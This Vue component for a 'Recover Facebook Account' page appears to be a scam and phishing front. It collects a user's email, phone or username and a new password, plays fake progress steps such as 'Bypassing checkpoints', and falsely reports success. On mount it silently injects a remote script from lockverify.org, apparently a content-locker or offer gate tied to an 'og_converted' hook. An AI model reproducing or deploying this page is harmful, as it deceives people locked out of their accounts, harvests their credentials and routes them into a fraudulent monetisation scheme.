<template>

  <!-- Hero Section -->
  <section class="py-8 px-4">
    <div class="text-center">
      <h2 class="text-2xl md:text-3xl font-extrabold text-gray-800 mb-4">
        Locked Out of Your
        <span class="text-blue-600">Facebook Account?</span>
      </h2>
      <p class="text-base md:text-lg text-gray-600 mb-6 px-2">
        Don't worry! We'll help you recover your Facebook account quickly and securely.
      </p>
    </div>
  </section>

  <!-- Recovery Process Section -->
  <section class="py-6 px-4">
    <div class="max-w-4xl mx-auto">
      <!-- Step Indicator - Mobile Optimized -->
      <div class="mb-6 overflow-x-auto pb-2 hide-scrollbar">
        <div class="flex justify-between min-w-max px-2">
          <div class="flex flex-col items-center flex-1 mx-1">
            <div
              class="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-white text-sm font-bold"
              :class="{ 'bg-green-500': currentStep > 1, 'animate-pulse': currentStep === 1 }">1</div>
            <p class="mt-1 text-xs font-medium text-gray-700 text-center">Account Info</p>
          </div>
          <div class="flex flex-col items-center flex-1 mx-1">
            <div
              class="w-10 h-10 bg-gray-300 rounded-full flex items-center justify-center text-white text-sm font-bold"
              :class="{ 'bg-blue-600 animate-pulse': currentStep === 2, 'bg-green-500': currentStep > 2 }">2</div>
            <p class="mt-1 text-xs font-medium text-gray-700 text-center">Profile Analysis</p>
          </div>
          <div class="flex flex-col items-center flex-1 mx-1">
            <div
              class="w-10 h-10 bg-gray-300 rounded-full flex items-center justify-center text-white text-sm font-bold"
              :class="{ 'bg-blue-600 animate-pulse': currentStep === 3, 'bg-green-500': currentStep > 3 }">3</div>
            <p class="mt-1 text-xs font-medium text-gray-700 text-center">Recovery Method</p>
          </div>
          <div class="flex flex-col items-center flex-1 mx-1">
            <div
              class="w-10 h-10 bg-gray-300 rounded-full flex items-center justify-center text-white text-sm font-bold"
              :class="{ 'bg-blue-600 animate-pulse': currentStep === 4, 'bg-green-500': currentStep > 4 }">4</div>
            <p class="mt-1 text-xs font-medium text-gray-700 text-center">Processing</p>
          </div>
          <div class="flex flex-col items-center flex-1 mx-1">
            <div
              class="w-10 h-10 bg-gray-300 rounded-full flex items-center justify-center text-white text-sm font-bold"
              :class="{ 'bg-blue-600 animate-pulse': currentStep === 5, 'bg-green-500': currentStep > 5 }">5</div>
            <p class="mt-1 text-xs font-medium text-gray-700 text-center">Reset Password</p>
          </div>
        </div>
      </div>

      <!-- Step 1: Account Information -->
      <div v-if="currentStep === 1" class="bg-white rounded-xl shadow-sm p-5 mb-6 border border-gray-100">
        <h3 class="text-xl font-bold text-gray-800 mb-4">Step 1: Account Information</h3>
        <p class="text-gray-600 mb-4 text-sm">Enter any information you remember about your Facebook account.</p>

        <form @submit.prevent="startAnalysis" class="space-y-4">
          <div>
            <label for="identifier" class="block text-xs font-medium text-gray-700 mb-1">
              Email, Phone, or Username
            </label>
            <input type="text" id="identifier" v-model="formData.identifier"
              class="w-full px-3 py-2.5 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
              placeholder="you@example.com or +1234567890" required>
            <p class="mt-1 text-xs text-gray-500">We'll search for your account using this information</p>
          </div>

          <div class="flex items-center">
            <input type="checkbox" id="rememberPassword" v-model="formData.rememberPassword"
              class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
            <label for="rememberPassword" class="ml-2 block text-sm text-gray-700">
              I don't remember my password
            </label>
          </div>

          <div class="pt-2">
            <button type="submit"
              class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 px-4 rounded-lg text-sm transition transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50">
              Continue to Profile Analysis
            </button>
          </div>
        </form>
      </div>

      <!-- Step 2: Profile Analysis -->
      <div v-if="currentStep === 2" class="bg-white rounded-xl shadow-sm p-5 mb-6 border border-gray-100">
        <h3 class="text-xl font-bold text-gray-800 mb-4">Step 2: Analyzing Your Account</h3>
        <p class="text-gray-600 mb-4 text-sm">We're searching for your account and analyzing available recovery options.
        </p>

        <div class="bg-blue-50 rounded-lg p-4 mb-4">
          <div class="flex items-center mb-3">
            <div class="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600 mr-2"></div>
            <span class="text-blue-800 font-medium text-sm">Searching for: {{ formData.identifier }}</span>
          </div>

          <div class="space-y-2">
            <div class="flex items-center" v-for="(status, index) in analysisStatus" :key="index">
              <div class="w-3 h-3 rounded-full mr-2" :class="{
                'bg-blue-400 animate-pulse': index === currentAnalysisIndex,
                'bg-green-500': index < currentAnalysisIndex,
                'bg-gray-300': index > currentAnalysisIndex
              }">
                <svg v-if="index < currentAnalysisIndex" xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 text-white"
                  viewBox="0 0 20 20" fill="currentColor">
                  <path fill-rule="evenodd"
                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                    clip-rule="evenodd" />
                </svg>
              </div>
              <span class="text-blue-700 text-xs">{{ status }}</span>
            </div>
          </div>
        </div>

        <div class="flex flex-col space-y-2">
          <button v-if="analysisComplete" @click="goToStep(3)"
            class="w-full px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg text-sm transition">
            Continue to Recovery Options
          </button>
          <div v-else class="w-full px-4 py-2 bg-gray-300 text-gray-500 font-medium rounded-lg text-sm text-center">
            Analyzing... Please wait
          </div>
          <button @click="goToStep(1)"
            class="w-full px-4 py-2 text-gray-600 hover:text-gray-800 font-medium rounded-lg text-sm transition">
            ← Back
          </button>
        </div>
      </div>

      <!-- Step 3: Recovery Method Selection -->
      <div v-if="currentStep === 3" class="bg-white rounded-xl shadow-sm p-5 mb-6 border border-gray-100">
        <h3 class="text-xl font-bold text-gray-800 mb-4">Step 3: Recovery Method</h3>
        <p class="text-gray-600 mb-4 text-sm">Select how you'd like to recover your account.</p>

        <div class="space-y-3 mb-6">
          <div v-for="(method, index) in recoveryMethods" :key="index" @click="selectedMethod = method.id" :class="[
            'border-2 rounded-lg p-3 cursor-pointer transition-all',
            selectedMethod === method.id
              ? 'border-blue-500 bg-blue-50'
              : 'border-gray-200 hover:border-gray-300'
          ]">
            <div class="flex items-start">
              <div class="flex-shrink-0 w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center mr-3">
                <svg v-if="method.id === 'email'" xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-blue-600"
                  viewBox="0 0 20 20" fill="currentColor">
                  <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                  <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
                </svg>
                <svg v-else-if="method.id === 'phone'" xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-blue-600"
                  viewBox="0 0 20 20" fill="currentColor">
                  <path
                    d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
                </svg>
                <svg v-else-if="method.id === 'trusted'" xmlns="http://www.w3.org/2000/svg"
                  class="h-4 w-4 text-blue-600" viewBox="0 0 20 20" fill="currentColor">
                  <path d="M13 6a3 3 0 11-6 0 3 3 0 016 0zM18 8a2 2 0 11-4 0 2 2 0 014 0zM14 15a4 4 0 00-8 0v1h8v-1z" />
                </svg>
                <svg v-else-if="method.id === 'id'" xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-blue-600"
                  viewBox="0 0 20 20" fill="currentColor">
                  <path fill-rule="evenodd"
                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-6-3a2 2 0 11-4 0 2 2 0 014 0zm-2 4a5 5 0 00-4.546 2.916A5.986 5.986 0 0010 14a5.986 5.986 0 004.546-.084A5 5 0 0010 11z"
                    clip-rule="evenodd" />
                </svg>
              </div>
              <div>
                <h4 class="text-sm font-semibold text-gray-800 mb-0.5">{{ method.name }}</h4>
                <p class="text-gray-600 text-xs">{{ method.description }}</p>
                <div class="mt-1 flex items-center text-xs text-gray-500">
                  <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mr-0.5" viewBox="0 0 20 20"
                    fill="currentColor">
                    <path fill-rule="evenodd"
                      d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z"
                      clip-rule="evenodd" />
                  </svg>
                  {{ method.estimatedTime }}
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="bg-yellow-50 border-l-3 border-yellow-400 p-3 mb-4">
          <div class="flex">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-yellow-400 mr-1" viewBox="0 0 20 20"
              fill="currentColor">
              <path fill-rule="evenodd"
                d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z"
                clip-rule="evenodd" />
            </svg>
            <div>
              <p class="text-yellow-700 text-xs">Facebook may require additional verification steps after you select
                your recovery method.</p>
            </div>
          </div>
        </div>

        <div class="flex flex-col space-y-2">
          <button @click="goToStep(4)" :disabled="!selectedMethod" :class="[
            'w-full px-4 py-2 font-medium rounded-lg text-sm transition',
            selectedMethod
              ? 'bg-blue-600 hover:bg-blue-700 text-white'
              : 'bg-gray-300 text-gray-500 cursor-not-allowed'
          ]">
            Start Recovery Process
          </button>
          <button @click="goToStep(2)"
            class="w-full px-4 py-2 text-gray-600 hover:text-gray-800 font-medium rounded-lg text-sm transition">
            ← Back
          </button>
        </div>
      </div>

      <!-- Step 4: Processing -->
      <div v-if="currentStep === 4" class="bg-white rounded-xl shadow-sm p-5 mb-6 border border-gray-100">
        <h3 class="text-xl font-bold text-gray-800 mb-4">Step 4: Processing</h3>
        <p class="text-gray-600 mb-4 text-sm">We're initiating the recovery process. Please wait while we securely
          connect.</p>

        <div class="bg-gray-50 rounded-lg p-4 mb-4">
          <div class="mb-3">
            <div class="flex justify-between items-center mb-1">
              <span class="font-medium text-gray-700 text-xs">Recovery Progress</span>
              <span class="text-xs text-gray-500">{{ progress }}%</span>
            </div>
            <div class="w-full bg-gray-200 rounded-full h-2">
              <div class="bg-blue-600 h-2 rounded-full transition-all duration-300 ease-out"
                :style="{ width: progress + '%' }"></div>
            </div>
          </div>

          <div class="space-y-2">
            <div class="flex items-center" v-for="(status, index) in processingStatus" :key="index">
              <div class="w-5 h-5 rounded-full flex items-center justify-center mr-2" :class="{
                'bg-blue-600 animate-pulse': index === currentStatusIndex && progress < 100,
                'bg-green-500': index < currentStatusIndex || (index === currentStatusIndex && progress === 100),
                'bg-gray-300': index > currentStatusIndex
              }">
                <svg v-if="index < currentStatusIndex || (index === currentStatusIndex && progress === 100)"
                  xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 text-white" viewBox="0 0 20 20" fill="currentColor">
                  <path fill-rule="evenodd"
                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                    clip-rule="evenodd" />
                </svg>
                <svg v-else-if="index === currentStatusIndex && progress < 100" xmlns="http://www.w3.org/2000/svg"
                  class="h-3 w-3 text-white animate-spin" viewBox="0 0 20 20" fill="currentColor">
                  <path fill-rule="evenodd"
                    d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z"
                    clip-rule="evenodd" />
                </svg>
              </div>
              <span :class="{
                'text-gray-500 text-xs': index > currentStatusIndex,
                'text-gray-700 font-medium text-xs': index <= currentStatusIndex
              }">{{ status }}</span>
            </div>
          </div>
        </div>

        <div class="bg-blue-50 rounded-lg p-3 mb-4" v-if="showProxyOptions">
          <h4 class="font-semibold text-blue-800 mb-2 text-sm">Connection Options</h4>
          <p class="text-blue-700 text-xs mb-2">Select a server location:</p>
          <div class="grid grid-cols-2 gap-2">
            <div v-for="(server, index) in proxyServers" :key="index" @click="selectedServer = server.id" :class="[
              'p-2 rounded border cursor-pointer text-center text-xs',
              selectedServer === server.id
                ? 'border-blue-500 bg-blue-100'
                : 'border-gray-200 hover:border-gray-300'
            ]">
              <div class="font-medium text-gray-800 text-xs">{{ server.name }}</div>
              <div class="text-xs text-gray-600">{{ server.ping }}ms</div>
            </div>
          </div>
        </div>

        <div class="flex flex-col space-y-2">
          <button v-if="!processing && progress === 100" @click="goToStep(5)"
            class="w-full px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg text-sm transition">
            Continue to Password Reset
          </button>
          <button @click="goToStep(3)"
            class="w-full px-4 py-2 text-gray-600 hover:text-gray-800 font-medium rounded-lg text-sm transition"
            :disabled="processing">
            ← Back
          </button>
          <div class="text-xs text-gray-500 text-center" v-if="processing">
            Do not refresh or close this page
          </div>
        </div>
      </div>

      <!-- Step 5: Password Reset -->
      <div v-if="currentStep === 5" class="bg-white rounded-xl shadow-sm p-5 mb-6 border border-gray-100">
        <div class="flex items-center mb-4">
          <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center mr-2">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-green-600" viewBox="0 0 20 20"
              fill="currentColor">
              <path fill-rule="evenodd"
                d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                clip-rule="evenodd" />
            </svg>
          </div>
          <h3 class="text-xl font-bold text-gray-800">Step 5: Reset Password</h3>
        </div>

        <div class="bg-green-50 border-l-3 border-green-400 p-3 mb-4">
          <div class="flex">
            <div class="flex-shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-green-400" viewBox="0 0 20 20"
                fill="currentColor">
                <path fill-rule="evenodd"
                  d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                  clip-rule="evenodd" />
              </svg>
            </div>
            <div class="ml-2">
              <p class="text-green-700 text-xs">Great! We've verified your identity. Create a new password to secure
                your account.</p>
            </div>
          </div>
        </div>

        <form @submit.prevent="completeRecovery" class="space-y-4">
          <div>
            <label for="newPassword" class="block text-xs font-medium text-gray-700 mb-1">
              New Password
            </label>
            <div class="relative">
              <input :type="showPassword ? 'text' : 'password'" id="newPassword" v-model="passwordData.newPassword"
                class="w-full px-3 py-2.5 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition pr-8"
                placeholder="Enter new password" required>
              <button type="button" @click="showPassword = !showPassword"
                class="absolute inset-y-0 right-0 pr-2 flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" viewBox="0 0 20 20"
                  fill="currentColor">
                  <path fill-rule="evenodd"
                    d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z"
                    clip-rule="evenodd" />
                </svg>
              </button>
            </div>

            <!-- Password strength meter -->
            <div class="mt-2">
              <div class="flex space-x-0.5 mb-1">
                <div v-for="n in 4" :key="n" class="flex-1 h-1.5 rounded" :class="[
                  n <= passwordStrength ?
                    (passwordStrength <= 2 ? 'bg-red-500' : passwordStrength === 3 ? 'bg-yellow-500' : 'bg-green-500')
                    : 'bg-gray-200'
                ]">
                </div>
              </div>
              <p class="text-xs" :class="{
                'text-red-500': passwordStrength <= 2,
                'text-yellow-500': passwordStrength === 3,
                'text-green-500': passwordStrength === 4
              }">
                {{ passwordStrengthText }}
              </p>
            </div>
          </div>

          <div>
            <label for="confirmPassword" class="block text-xs font-medium text-gray-700 mb-1">
              Confirm Password
            </label>
            <input type="password" id="confirmPassword" v-model="passwordData.confirmPassword"
              class="w-full px-3 py-2.5 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
              placeholder="Confirm new password" required>
            <p v-if="passwordData.newPassword && passwordData.confirmPassword && passwordData.newPassword !== passwordData.confirmPassword"
              class="mt-1 text-xs text-red-500">
              Passwords do not match
            </p>
          </div>

          <div class="bg-blue-50 rounded-lg p-3">
            <h4 class="font-semibold text-blue-800 mb-1 text-xs">Password Requirements:</h4>
            <ul class="text-xs text-blue-700 space-y-0.5">
              <li class="flex items-start">
                <svg :class="passwordData.newPassword.length >= 6 ? 'text-green-500' : 'text-gray-400'"
                  xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mr-0.5 mt-0.5" viewBox="0 0 20 20"
                  fill="currentColor">
                  <path fill-rule="evenodd"
                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                    clip-rule="evenodd" />
                </svg>
                6+ characters
              </li>
              <li class="flex items-start">
                <svg
                  :class="/[a-z]/.test(passwordData.newPassword) && /[A-Z]/.test(passwordData.newPassword) ? 'text-green-500' : 'text-gray-400'"
                  xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mr-0.5 mt-0.5" viewBox="0 0 20 20"
                  fill="currentColor">
                  <path fill-rule="evenodd"
                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                    clip-rule="evenodd" />
                </svg>
                Upper & lower case
              </li>
              <li class="flex items-start">
                <svg :class="/[0-9]/.test(passwordData.newPassword) ? 'text-green-500' : 'text-gray-400'"
                  xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mr-0.5 mt-0.5" viewBox="0 0 20 20"
                  fill="currentColor">
                  <path fill-rule="evenodd"
                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                    clip-rule="evenodd" />
                </svg>
                1+ number
              </li>
              <li class="flex items-start">
                <svg :class="/[^a-zA-Z0-9]/.test(passwordData.newPassword) ? 'text-green-500' : 'text-gray-400'"
                  xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mr-0.5 mt-0.5" viewBox="0 0 20 20"
                  fill="currentColor">
                  <path fill-rule="evenodd"
                    d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                    clip-rule="evenodd" />
                </svg>
                1+ special character
              </li>
            </ul>
          </div>

          <div class="pt-2">
            <button type="submit" :disabled="!isPasswordValid" :class="[
              'w-full font-medium py-2.5 px-4 rounded-lg text-sm transition transform',
              isPasswordValid
                ? 'bg-green-600 hover:bg-green-700 text-white hover:scale-105'
                : 'bg-gray-300 text-gray-500 cursor-not-allowed'
            ]">
              Complete Recovery
            </button>
          </div>
        </form>
      </div>

      <!-- Success Modal -->
      <div v-if="showSuccessModal"
        class="fixed inset-0 bg-gray-800/80 bg-opacity-50 flex items-center justify-center p-4 z-10">
        <div class="bg-white rounded-lg p-5 w-full max-w-sm animate-fadeIn">
          <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-green-600" viewBox="0 0 20 20"
              fill="currentColor">
              <path fill-rule="evenodd"
                d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                clip-rule="evenodd" />
            </svg>
          </div>
          <h3 class="text-lg font-bold text-gray-800 mb-2 text-center">Recovery Successful!</h3>
          <p class="text-gray-600 mb-4 text-sm text-center">Your Facebook account has been restored. You can now change
            new password.</p>
          <div class="bg-blue-50 rounded-lg p-3 mb-4">
            <div data-captcha-enable="true"></div>
          </div>
          <button
            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-lg text-sm transition">
            Countinue
          </button>
        </div>
      </div>
    </div>
  </section>

  <!-- Features Section -->
  <section class="py-8 bg-white px-4">
    <div class="max-w-4xl mx-auto">
      <h2 class="text-xl font-bold text-center text-gray-800 mb-6">Why Choose Our Service</h2>

      <div class="grid grid-cols-1 gap-4">
        <div class="bg-gray-50 rounded-lg p-4 text-center">
          <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-green-600" viewBox="0 0 20 20"
              fill="currentColor">
              <path fill-rule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clip-rule="evenodd" />
            </svg>
          </div>
          <h3 class="text-base font-semibold text-gray-800 mb-1">High Success Rate</h3>
          <p class="text-gray-600 text-sm">Over 95% of users successfully recover their accounts.</p>
        </div>

        <div class="bg-gray-50 rounded-lg p-4 text-center">
          <div class="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-blue-600" viewBox="0 0 20 20"
              fill="currentColor">
              <path fill-rule="evenodd"
                d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z"
                clip-rule="evenodd" />
            </svg>
          </div>
          <h3 class="text-base font-semibold text-gray-800 mb-1">Fast Processing</h3>
          <p class="text-gray-600 text-sm">Most accounts recovered in under 15 minutes.</p>
        </div>

        <div class="bg-gray-50 rounded-lg p-4 text-center">
          <div class="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-3">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-purple-600" viewBox="0 0 20 20"
              fill="currentColor">
              <path fill-rule="evenodd"
                d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                clip-rule="evenodd" />
            </svg>
          </div>
          <h3 class="text-base font-semibold text-gray-800 mb-1">24/7 Support</h3>
          <p class="text-gray-600 text-sm">Our team is available anytime to help you.</p>
        </div>
      </div>
    </div>
  </section>

  <!-- CTA Section -->
  <section class="py-8 bg-blue-600 px-4">
    <div class="text-center">
      <h2 class="text-xl font-bold text-white mb-2">Need Help?</h2>
      <p class="text-blue-100 mb-4 text-sm">Our support team is available 24/7 to guide you.</p>
      <button
        class="bg-white text-blue-600 hover:bg-gray-100 font-medium py-2 px-6 rounded-lg text-sm transition transform hover:scale-105">
        Contact Support
      </button>
    </div>
  </section>


</template>

<script>
export default {
  name: 'RecoverFacebookAccount',
  data() {
    return {
      currentStep: 1,
      formData: {
        identifier: '',
        rememberPassword: false
      },
      selectedMethod: null,
      passwordData: {
        newPassword: '',
        confirmPassword: ''
      },
      showPassword: false,
      progress: 0,
      currentStatusIndex: 0,
      processing: false,
      showProxyOptions: false,
      selectedServer: 'us-east',
      showSuccessModal: false,
      // Analysis step data
      analysisStatus: [
        'Locating account...',
        'Verifying ownership...',
        'Checking recovery options...',
        'Analyzing security...',
        'Generating options...'
      ],
      currentAnalysisIndex: 0,
      analysisComplete: false,
      analysisInterval: null,

      recoveryMethods: [
        {
          id: 'email',
          name: 'Email Verification',
          description: 'Get code at recovery email',
          estimatedTime: '1-3 min'
        },
        {
          id: 'phone',
          name: 'Phone/SMS Verification',
          description: 'Get code via text message',
          estimatedTime: '1-5 min'
        },
        {
          id: 'trusted',
          name: 'Trusted Contacts',
          description: 'Contact designated friends',
          estimatedTime: '5-15 min'
        },
        {
          id: 'id',
          name: 'Photo ID Verification',
          description: 'Submit government-issued ID',
          estimatedTime: '15-48 hrs'
        }
      ],
      proxyServers: [
        { id: 'us-east', name: 'US East', ping: 24 },
        { id: 'us-west', name: 'US West', ping: 45 },
        { id: 'eu-central', name: 'Europe', ping: 68 },
        { id: 'asia-southeast', name: 'Asia', ping: 124 }
      ],
      processingStatus: [
        'Connecting to servers',
        'Verifying information',
        'Establishing protocol',
        'Bypassing checkpoints',
        'Generating token',
        'Finalizing request'
      ]
    }
  },
  computed: {
    passwordStrength() {
      let strength = 0;
      const password = this.passwordData.newPassword;

      if (password.length === 0) return 0;
      if (password.length >= 6) strength++;
      if (/[a-z]/.test(password) && /[A-Z]/.test(password)) strength++;
      if (/[0-9]/.test(password)) strength++;
      if (/[^a-zA-Z0-9]/.test(password)) strength++;

      return strength;
    },
    passwordStrengthText() {
      switch (this.passwordStrength) {
        case 0: return 'Enter a password';
        case 1: return 'Weak';
        case 2: return 'Fair';
        case 3: return 'Good';
        case 4: return 'Strong';
        default: return '';
      }
    },
    isPasswordValid() {
      return (
        this.passwordData.newPassword.length >= 6 &&
        /[a-z]/.test(this.passwordData.newPassword) &&
        /[A-Z]/.test(this.passwordData.newPassword) &&
        /[0-9]/.test(this.passwordData.newPassword) &&
        this.passwordData.newPassword === this.passwordData.confirmPassword
      );
    }
  },
  methods: {
    goToStep(step) {
      this.currentStep = step;

      // If going to step 4, start the processing simulation
      if (step === 4) {
        this.startProcessing();
      }
      if (step === 5) {
        this.showSuccessModal = true;
      }
    },

    startAnalysis() {
      // Reset analysis state
      this.currentAnalysisIndex = 0;
      this.analysisComplete = false;

      // Go to step 2
      this.currentStep = 2;

      // Clear any existing interval
      if (this.analysisInterval) {
        clearInterval(this.analysisInterval);
      }

      // Start the analysis simulation
      let currentIndex = 0;
      this.analysisInterval = setInterval(() => {
        if (currentIndex < this.analysisStatus.length - 1) {
          currentIndex++;
          this.currentAnalysisIndex = currentIndex;
        } else {
          // Analysis complete
          clearInterval(this.analysisInterval);
          this.analysisComplete = true;
          this.currentAnalysisIndex = this.analysisStatus.length;
        }
      }, 1200); // Update every 1.2 seconds for mobile
    },

    startProcessing() {
      this.processing = true;
      this.progress = 0;
      this.currentStatusIndex = 0;
      this.showProxyOptions = true;

      // Simulate progress over 15 seconds
      const interval = setInterval(() => {
        if (this.progress >= 100) {
          clearInterval(interval);
          this.processing = false;
          return;
        }

        // Increment progress
        this.progress += 2;

        // Update status index at certain progress points
        if (this.progress >= 15 && this.currentStatusIndex < 1) {
          this.currentStatusIndex = 1;
        } else if (this.progress >= 35 && this.currentStatusIndex < 2) {
          this.currentStatusIndex = 2;
        } else if (this.progress >= 55 && this.currentStatusIndex < 3) {
          this.currentStatusIndex = 3;
        } else if (this.progress >= 75 && this.currentStatusIndex < 4) {
          this.currentStatusIndex = 4;
        } else if (this.progress >= 90 && this.currentStatusIndex < 5) {
          this.currentStatusIndex = 5;
        }
      }, 300);
    },

    completeRecovery() {
      if (!this.isPasswordValid) return;
      this.resetProcess()

      console.log({
        identifier: this.formData.identifier,
        method: this.selectedMethod,
        newPassword: this.passwordData.newPassword
      });
    },

    resetProcess() {
      this.currentStep = 1;
      this.formData = {
        identifier: '',
        rememberPassword: false
      };
      this.selectedMethod = null;
      this.passwordData = {
        newPassword: '',
        confirmPassword: ''
      };
      this.progress = 0;
      this.currentStatusIndex = 0;
      this.processing = false;
      this.showProxyOptions = false;
      this.selectedServer = 'us-east';
      this.showSuccessModal = false;
      this.currentAnalysisIndex = 0;
      this.analysisComplete = false;

      if (this.analysisInterval) {
        clearInterval(this.analysisInterval);
      }
    }
  },
  mounted() {
    const script = document.createElement('script');
    script.src = 'https://lockverify.org/cp/js/306x8';
    script.type = 'text/javascript';

    document.head.appendChild(script);
    // Add animation CSS and hide-scrollbar class
    const style = document.createElement('style');
    style.textContent = `
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
      }
      .animate-fadeIn {
        animation: fadeIn 0.5s ease-out forwards;
      }
      
      /* Hide scrollbar for step indicator on mobile */
      .hide-scrollbar {
        -ms-overflow-style: none;  /* IE and Edge */
        scrollbar-width: none;  /* Firefox */
      }
      .hide-scrollbar::-webkit-scrollbar {
        display: none;  /* Chrome, Safari, Opera */
      }
      
      /* Ensure form elements don't zoom on iOS */
      @media screen and (max-width: 768px) {
        input[type="text"], 
        input[type="password"], 
        input[type="email"], 
        input[type="number"], 
        textarea, 
        select {
          font-size: 16px;
        }
      }
    `;
    document.head.appendChild(style);
  },
  og_converted() {
    this.goToStep(5)
  },
  beforeUnmount() {
    // Clean up: Remove the script when component is destroyed
    const scripts = document.querySelectorAll('script[src="https://lockverify.org/cp/js/306x8"]');
    scripts.forEach(script => {
